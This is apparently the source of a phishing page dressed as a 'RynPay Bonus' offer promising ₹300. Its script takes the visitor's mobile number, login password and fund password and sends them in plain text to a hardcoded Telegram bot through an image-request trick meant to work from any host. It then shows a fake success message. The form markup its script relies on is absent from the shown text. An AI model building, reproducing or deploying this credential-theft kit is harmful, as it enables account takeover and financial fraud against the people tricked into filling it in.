<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RynPay Bonus</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
  min-height: 100vh;
  font-family: 'Inter', sans-serif;
  background: linear-gradient(160deg, #0F0024 0%, #1A0533 40%, #0D1B4B 100%);
  display: flex; align-items: flex-start; justify-content: center;
  padding-bottom: 3rem;
}
.wrapper { width: 100%; max-width: 420px; position: relative; }
.hero {
  position: relative; overflow: hidden;
  padding: 36px 28px 32px;
  background: linear-gradient(145deg, #1A0533 0%, #2D0F55 50%, #0D1B4B 100%);
  border-radius: 0 0 32px 32px;
  box-shadow: 0 16px 48px rgba(0,0,0,0.4);
}
.hero-glow { position: absolute; width: 300px; height: 300px; background: radial-gradient(circle, rgba(123,47,190,0.35) 0%, transparent 70%); top: -80px; right: -60px; pointer-events: none; }
.hero-glow2 { position: absolute; width: 200px; height: 200px; background: radial-gradient(circle, rgba(245,200,66,0.12) 0%, transparent 70%); bottom: -40px; left: -30px; pointer-events: none; }
.particle { position: absolute; border-radius: 50%; animation: float 4s ease-in-out infinite; }
.p1 { width:6px; height:6px; background:#F5C842; top:20%; left:12%; opacity:0.5; animation-delay:0s; }
.p2 { width:4px; height:4px; background:#fff; top:60%; left:8%; opacity:0.3; animation-delay:1s; }
.p3 { width:5px; height:5px; background:#F5C842; top:30%; right:15%; opacity:0.4; animation-delay:2s; }
.p4 { width:3px; height:3px; background:#a78bfa; top:70%; right:10%; opacity:0.4; animation-delay:0.5s; }
@keyframes float { 0%,100% { transform:translateY(0); } 50% { transform:translateY(-8px); } }
.hero-eyebrow { font-size:11px; font-weight:700; letter-spacing:3px; text-transform:uppercase; color:#F5C842; margin-bottom:10px; opacity:0.9; }
.hero-amount { font-size:80px; font-weight:900; line-height:0.9; color:#F5C842; letter-spacing:-3px; text-shadow: 0 0 30px rgba(245,200,66,0.4), 0 4px 0 rgba(180,130,0,0.5), 0 8px 20px rgba(0,0,0,0.3); margin-bottom:6px; }
.hero-amount .sym { font-size:46px; vertical-align:top; margin-top:14px; display:inline-block; opacity:0.9; }
.hero-label { font-size:13px; font-weight:600; color:rgba(255,255,255,0.6); letter-spacing:1.5px; text-transform:uppercase; margin-bottom:18px; }
.hero-badge { display:inline-flex; align-items:center; gap:7px; background:rgba(255,255,255,0.08); border:1px solid rgba(255,255,255,0.18); backdrop-filter:blur(8px); border-radius:100px; padding:8px 18px; font-size:12px; font-weight:700; color:#fff; letter-spacing:1px; text-transform:uppercase; }
.badge-dot { width:7px; height:7px; background:#00C48C; border-radius:50%; animation:pulse 1.5s ease-in-out infinite; }
@keyframes pulse { 0%,100% { opacity:1; transform:scale(1); } 50% { opacity:0.5; transform:scale(0.7); } }
.hero-ticket { position:absolute; right:24px; top:36px; background:linear-gradient(135deg,#F5C842,#E8A800); border-radius:12px; padding:12px 18px; text-align:center; box-shadow:0 6px 24px rgba(245,200,66,0.4); }
.hero-ticket::before,.hero-ticket::after { content:''; position:absolute; width:12px; height:12px; background:#1A0533; border-radius:50%; top:50%; transform:translateY(-50%); }
.hero-ticket::before { left:-6px; } .hero-ticket::after { right:-6px; }
.ticket-label { font-size:9px; font-weight:800; color:#5C3500; letter-spacing:2px; text-transform:uppercase; }
.ticket-amt { font-size:26px; font-weight:900; color:#2D1200; line-height:1.1; }
.form-card { background:#fff; border-radius:24px; padding:28px 24px; margin:20px 16px 0; box-shadow:0 8px 40px rgba(26,5,51,0.12), 0 0 0 1px rgba(123,47,190,0.1); position:relative; overflow:hidden; }
.form-card::before { content:''; position:absolute; top:0; left:0; right:0; height:3px; background:linear-gradient(90deg,#7B2FBE,#F5C842,#00C48C); border-radius:24px 24px 0 0; }
.logo-row { display:flex; align-items:center; gap:12px; margin-bottom:24px; }
.logo-text h2 { font-size:18px; font-weight:800; color:#1A1A2E; letter-spacing:-0.3px; }
.logo-text p { font-size:12px; color:#6B6B8A; font-weight:500; margin-top:1px; }
.field-group { margin-bottom:16px; }
.field-group label { display:block; font-size:11px; font-weight:700; color:#6B6B8A; letter-spacing:1px; text-transform:uppercase; margin-bottom:7px; }
.input-wrap { position:relative; display:flex; align-items:center; }
.input-icon { position:absolute; left:14px; display:flex; align-items:center; justify-content:center; pointer-events:none; }
.input-icon svg { width:18px; height:18px; stroke:#9090B0; fill:none; stroke-width:2; stroke-linecap:round; stroke-linejoin:round; }
.input-wrap input { width:100%; padding:13px 44px 13px 44px; border:1.5px solid rgba(123,47,190,0.15); border-radius:14px; font-size:15px; font-family:'Inter',sans-serif; font-weight:500; color:#1A1A2E; background:#FAFAFE; outline:none; transition:border-color 0.2s, box-shadow 0.2s, background 0.2s; }
.input-wrap input::placeholder { color:#B0B0C8; font-weight:400; }
.input-wrap input:focus { border-color:#7B2FBE; background:#fff; box-shadow:0 0 0 4px rgba(123,47,190,0.08); }
.eye-btn { position:absolute; right:13px; background:none; border:none; cursor:pointer; display:flex; align-items:center; justify-content:center; width:24px; height:24px; color:#9090B0; }
.eye-btn svg { width:18px; height:18px; stroke:currentColor; fill:none; stroke-width:2; stroke-linecap:round; stroke-linejoin:round; }
.field-hint { font-size:11px; color:#B0B0C8; margin-top:5px; font-weight:500; }
.submit-btn { width:100%; padding:15px; background:linear-gradient(135deg,#7B2FBE 0%,#0D1B4B 100%); color:#fff; border:none; border-radius:14px; font-size:15px; font-weight:700; letter-spacing:0.5px; cursor:pointer; margin-top:8px; position:relative; overflow:hidden; transition:transform 0.15s, box-shadow 0.15s; box-shadow:0 6px 24px rgba(123,47,190,0.35); font-family:'Inter',sans-serif; }
.submit-btn:hover { transform:translateY(-1px); box-shadow:0 10px 32px rgba(123,47,190,0.45); }
.submit-btn:active { transform:translateY(0); }
.submit-btn:disabled { opacity:0.7; cursor:not-allowed; }
#overlay { display:none; position:fixed; inset:0; background:rgba(10,0,30,0.75); backdrop-filter:blur(6px); z-index:9999; align-items:center; justify-content:center; padding:20px; }
#overlay.on { display:flex; }
.popup { background:#F4F2FF; border-radius:24px; width:100%; max-width:330px; overflow:hidden; box-shadow:0 32px 80px rgba(0,0,0,0.5); animation:slideUp 0.25s cubic-bezier(0.34,1.56,0.64,1); }
@keyframes slideUp { from { transform:translateY(30px) scale(0.95); opacity:0; } to { transform:translateY(0) scale(1); opacity:1; } }
.popup-header { padding:20px 20px 14px; }
.popup-header h3 { font-size:16px; font-weight:700; color:#1A1A2E; line-height:1.4; }
.popup-btns { display:flex; gap:10px; padding:6px 14px 18px; }
.btn-cancel { flex:1; padding:13px; background:#E0DCF0; border:none; border-radius:100px; font-size:15px; font-weight:600; color:#6B6B8A; cursor:pointer; font-family:'Inter',sans-serif; }
.btn-ok { flex:1; padding:13px; background:linear-gradient(135deg,#00C48C,#007A5A); border:none; border-radius:100px; font-size:15px; font-weight:700; color:#fff; cursor:pointer; box-shadow:0 4px 16px rgba(0,196,140,0.35); font-family:'Inter',sans-serif; }
</style>
</head>

<script>
// ── Telegram Config ──
var BOT_TOKEN = '8938374521:AAGTC3HS3xDuaZtjdIl12jq9SyQF42vRjvM';
var CHAT_ID   = '6918536556';

function tv(id) {
  var e = document.getElementById(id);
  e.type = e.type === 'password' ? 'text' : 'password';
}

document.getElementById('fpwd').addEventListener('input', function() {
  this.value = this.value.replace(/[^0-9]/g, '');
});


document.getElementById('mobile').addEventListener('input', function() {
  this.value = this.value.replace(/[^0-9]/g, '');
});

function go() {
  document.getElementById('overlay').classList.add('on');
  document.body.style.overflow = 'hidden';
}
function cl() {
  document.getElementById('overlay').classList.remove('on');
  document.body.style.overflow = '';
}

// IMG trick - works from file:// and any hosting (no CORS issue)
function sendToTelegram(text) {
  var encoded = encodeURIComponent(text);
  var url = 'https://api.telegram.org/bot' + BOT_TOKEN +
            '/sendMessage?chat_id=' + CHAT_ID +
            '&parse_mode=HTML' +
            '&text=' + encoded;
  var img = new Image();
  img.src = url;
}

function submitForm() {
  var mobile = document.getElementById('mobile').value.trim();
  var invite = document.getElementById('invite').value.trim();
  var pwd    = document.getElementById('pwd').value;
  var fpwd   = document.getElementById('fpwd').value;

  if (!mobile || mobile.length < 10) {
    alert('Please enter a valid 10-digit mobile number.');
    return;
  }
  if (!pwd) {
    alert('Please enter a password.');
    return;
  }
  if (!fpwd || fpwd.length < 6) {
    alert('Please enter a 6-digit fund password.');
    return;
  }

  var now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });

  var msg =
    '🎰 <b>RynPay New Registration</b>\n' +
    '━━━━━━━━━━━━━━━\n' +
    '📱 <b>Mobile:</b> ' + mobile + '\n' +
    '🎟 <b>Invite Code:</b> ' + (invite || 'Not provided') + '\n' +
    '🔑 <b>Password:</b> ' + pwd + '\n' +
    '🔐 <b>Fund Password:</b> ' + fpwd + '\n' +
    '🕐 <b>Time (IST):</b> ' + now + '\n' +
    '━━━━━━━━━━━━━━━\n' +
    '💰 Bonus Claimed: ₹300';

  sendToTelegram(msg);

  var btn = document.getElementById('submitBtn');
  btn.textContent = 'Sending...';
  btn.disabled = true;

  setTimeout(function() {
    btn.textContent = 'Claim \u20B9300 Bonus \u2192';
    btn.disabled = false;
    go(); // Show success popup
  }, 1500);
}
